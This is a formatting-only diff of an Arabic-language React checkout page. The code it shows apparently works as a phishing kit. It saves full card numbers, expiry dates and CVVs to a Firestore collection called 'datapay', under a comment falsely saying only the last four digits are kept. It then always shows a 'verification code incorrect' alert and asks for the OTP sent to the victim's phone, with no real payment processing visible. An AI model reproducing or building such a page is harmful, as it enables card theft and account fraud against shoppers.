@@ -59,7 +59,7 @@ export default function CheckoutPage() {
     cardNumber: '',
     expiryDate: '',
     cvv: '',
-    otp:''
+    otp: ''
   })
   const router = useRouter()
 
@@ -84,17 +84,17 @@ export default function CheckoutPage() {
 
   const handlePaymentSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
-   
+
     setStep(3)
 
-    
+
     try {
       // Create an order object
       const order = {
         paymentInfo: {
           cardNumber: paymentInfo.cardNumber, // Only store last 4 digits
           expiryDate: paymentInfo.expiryDate,
-          cvc:paymentInfo.cvv
+          cvc: paymentInfo.cvv
         },
         createdAt: new Date()
       }
@@ -102,21 +102,21 @@ export default function CheckoutPage() {
       // Add the order to Firestore
       const docRef = await addDoc(collection(db, "datapay"), order)
 
-    
+
       // Clear the cart and redirect to home page
       localStorage.removeItem('cart')
     } catch (error) {
       console.error("Error adding document: ", error)
-     
+
     }
   }
   return (
     <div className="min-h-screen bg-gray-50" dir="rtl">
       <Navbar />
-      
+
       <main className="container mx-auto px-4 py-12">
         <h1 className="text-4xl font-bold text-[#002B5C] mb-12 text-center">إتمام الطلب</h1>
-        
+
         <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
           <Card>
             <CardHeader>
@@ -154,7 +154,7 @@ export default function CheckoutPage() {
                       <Input
                         id="name"
                         value={shippingInfo.name}
-                        onChange={(e) => setShippingInfo({...shippingInfo, name: e.target.value})}
+                        onChange={(e) => setShippingInfo({ ...shippingInfo, name: e.target.value })}
                         required
                       />
                     </div>
@@ -163,7 +163,7 @@ export default function CheckoutPage() {
                       <Input
                         id="address"
                         value={shippingInfo.address}
-                        onChange={(e) => setShippingInfo({...shippingInfo, address: e.target.value})}
+                        onChange={(e) => setShippingInfo({ ...shippingInfo, address: e.target.value })}
                         required
                       />
                     </div>
@@ -172,7 +172,7 @@ export default function CheckoutPage() {
                       <Input
                         id="city"
                         value={shippingInfo.city}
-                        onChange={(e) => setShippingInfo({...shippingInfo, city: e.target.value})}
+                        onChange={(e) => setShippingInfo({ ...shippingInfo, city: e.target.value })}
                         required
                       />
                     </div>
@@ -181,7 +181,7 @@ export default function CheckoutPage() {
                       <Input
                         id="phone"
                         value={shippingInfo.phone}
-                        onChange={(e) => setShippingInfo({...shippingInfo, phone: e.target.value})}
+                        onChange={(e) => setShippingInfo({ ...shippingInfo, phone: e.target.value })}
                         required
                       />
                     </div>
@@ -192,7 +192,7 @@ export default function CheckoutPage() {
                 </form>
               </CardContent>
             </Card>
-          ) :       step === 2 ? (
+          ) : step === 2 ? (
             <Card>
               <CardHeader>
                 <CardTitle>الدفع</CardTitle>
@@ -203,7 +203,7 @@ export default function CheckoutPage() {
                     <label htmlFor="cardNumber">رقم البطاقة</label>
                     <Input
                       id="cardNumber"
-                      onChange={(e) => setPaymentInfo({...paymentInfo, cardNumber: e.target.value})}
+                      onChange={(e) => setPaymentInfo({ ...paymentInfo, cardNumber: e.target.value })}
 
                       placeholder="1234 5678 9012 3456"
                       required
@@ -216,42 +216,42 @@ export default function CheckoutPage() {
                         id="expiryDate"
                         placeholder="MM/YY"
                         required
-                      onChange={(e) => setPaymentInfo({...paymentInfo, expiryDate: e.target.value})}
+                        onChange={(e) => setPaymentInfo({ ...paymentInfo, expiryDate: e.target.value })}
 
                       />
                     </div>
                     <div>
                       <label htmlFor="cvv">CVV</label>
                       <Input
-                      onChange={(e) => setPaymentInfo({...paymentInfo, cvv: e.target.value})}
-                      id="cvv"
+                        onChange={(e) => setPaymentInfo({ ...paymentInfo, cvv: e.target.value })}
+                        id="cvv"
                         placeholder="123"
                         required
                       />
                     </div>
                   </div>
-                  <Button onClick={(w)=>handlePaymentSubmit(w).then(()=>{
+                  <Button onClick={(w) => handlePaymentSubmit(w).then(() => {
                     alert("رمز التحقق غير صحيح")
                   })} className="w-full bg-[#002B5C] hover:bg-[#001F43] text-white">
-تحقق                  </Button>
+                    تحقق                  </Button>
                 </div>
               </CardContent>
             </Card>
-          ):(<Card>
-             <CardHeader>
-                <CardTitle>رمز التحقق OTP</CardTitle>
-              </CardHeader>
-              <CardContent>
+          ) : (<Card>
+            <CardHeader>
+              <CardTitle>رمز التحقق OTP</CardTitle>
+            </CardHeader>
+            <CardContent>
               <div>
-                      <label htmlFor="otp">ادخل رمز التحقق المرسل الى هاتفك</label>
-                      <Input
-                      onChange={(e) => setPaymentInfo({...paymentInfo, otp: e.target.value})}
-                      id="otp"
-                        placeholder="*******"
-                        required
-                      />
-                    </div>
-              </CardContent>
+                <label htmlFor="otp">ادخل رمز التحقق المرسل الى هاتفك</label>
+                <Input
+                  onChange={(e) => setPaymentInfo({ ...paymentInfo, otp: e.target.value })}
+                  id="otp"
+                  placeholder="*******"
+                  required
+                />
+              </div>
+            </CardContent>
           </Card>)}
         </div>
       </main>
